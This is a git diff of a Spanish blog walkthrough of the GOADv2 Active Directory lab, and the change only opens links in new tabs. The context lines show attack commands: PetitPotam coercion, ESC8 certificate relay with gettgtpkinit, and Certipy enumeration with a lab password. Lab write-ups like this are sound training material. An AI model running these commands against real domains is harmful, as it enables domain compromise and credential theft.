@@ -2944,7 +2944,7 @@ SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] gre
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2022.png)
 
-Comprobar si la inscripción por Internet funciona en: [http://192.168.56.23/certsrv/certfnsh.asp](http://192.168.56.23/certsrv/certfnsh.asp) y ver que pide autenticación, así que se puede probar el ataque.
+Comprobar si la inscripción por Internet funciona en: [http://192.168.56.23/certsrv/certfnsh.asp](http://192.168.56.23/certsrv/certfnsh.asp){:target="_blank"} y ver que pide autenticación, así que se puede probar el ataque.
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2023.png)
 
@@ -2975,7 +2975,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Servers started, waiting for connections
 ```
 
-Por otra parte, se ejecuta el [petitpotam](https://github.com/topotam/PetitPotam) utilizando el comando: `PetitPotam.py 192.168.56.104 meereen.essos.local` Una vez completado, se recibe la confirmación "Attack worked!”
+Por otra parte, se ejecuta el [petitpotam](https://github.com/topotam/PetitPotam){:target="_blank"} utilizando el comando: `PetitPotam.py 192.168.56.104 meereen.essos.local` Una vez completado, se recibe la confirmación "Attack worked!”
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody]
@@ -3092,7 +3092,7 @@ En este punto, se procede a guardar el certificado en un archivo que puede nombr
 ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-Se solicitará un TGT utilizando la herramienta [gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) Esto se realizará con el siguiente comando: `gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'`
+Se solicitará un TGT utilizando la herramienta [gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py){:target="_blank"} Esto se realizará con el siguiente comando: `gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'`
 
 ```csharp
 ┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3189,7 +3189,7 @@ SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
 
 ## ESC8 - con certipy
 
-En primer lugar, se instala la herramienta [certipy](https://github.com/ly4k/Certipy) utilizando el comando: `pip3 install certipy-ad`
+En primer lugar, se instala la herramienta [certipy](https://github.com/ly4k/Certipy){:target="_blank"} utilizando el comando: `pip3 install certipy-ad`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3499,7 +3499,7 @@ SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
 
 ## ADCS enumeración con certipy y bloodhound
 
-Utilizando la herramienta [certipy](https://github.com/ly4k/Certipy) para realizar una enumeración de las ADCS, para esto ejecutamos el comando `certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12` Como resultado, se obtiene un volcado de información que incluye tres archivos: un archivo de texto, un archivo JSON y un archivo ZIP, que se pueden cargar en BloodHound.
+Utilizando la herramienta [certipy](https://github.com/ly4k/Certipy){:target="_blank"} para realizar una enumeración de las ADCS, para esto ejecutamos el comando `certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12` Como resultado, se obtiene un volcado de información que incluye tres archivos: un archivo de texto, un archivo JSON y un archivo ZIP, que se pueden cargar en BloodHound.
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3732,7 +3732,7 @@ Se puede observar información que indica que ESC1 y ESC2 son vulnerables, entre
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2024.png)
 
-Siguiendo el proceso, se procede a cargar el archivo ZIP en BloodHound. Para llevar a cabo esta tarea, se debe utilizar una versión modificada de BloodHound proporcionada por ly4k [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases) ly se inicia BloodHound de la misma manera que se hizo en sesiones anteriores. [BloodHound](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#bloodhound)
+Siguiendo el proceso, se procede a cargar el archivo ZIP en BloodHound. Para llevar a cabo esta tarea, se debe utilizar una versión modificada de BloodHound proporcionada por ly4k [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases){:target="_blank"} ly se inicia BloodHound de la misma manera que se hizo en sesiones anteriores. [BloodHound](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#bloodhound)
 
 Iniciando el proceso, se inicia el Neo4j, el cual debe ser una versión superior a 4.0.0. Posteriormente, BloodHound se inicia con el comando `./BloodHound --no-sandbox`Una vez que BloodHound se inicia, se procede a cargar el archivo ZIP siguiendo el mismo procedimiento que se realizó en sesiones anteriores. 
 
